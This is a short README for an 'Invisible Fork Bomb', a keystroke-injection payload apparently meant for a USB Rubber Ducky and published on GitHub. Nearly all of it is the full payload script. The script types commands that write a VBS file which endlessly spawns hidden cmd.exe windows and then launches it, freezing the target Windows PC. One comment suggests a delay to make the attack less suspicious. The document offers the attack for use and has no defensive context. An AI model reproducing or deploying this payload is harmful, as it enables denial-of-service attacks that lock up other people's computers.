# Invisible Fork Bomb
The script creates and starts a vbs that executes exponentially cmd.exe (Fork bomb -> Freezes the PC).

# About...
Author: [BlueArduino20](https://github.com/BlueArduino20/)

Version 1.0

Repository: [https://github.com/BlueArduino20/Invisible_fork_bomb](https://github.com/BlueArduino20/Invisible_fork_bomb)

# Code
<pre><code>
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING copy con forkb.vbs
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
REM STRING ping localhost -n 10
REM You can uncomment this ^ to delay 10 seconds before starting the fork bomb. (By this way it's less suspicious)
STRING start forkb.vbs
ENTER
</pre></code>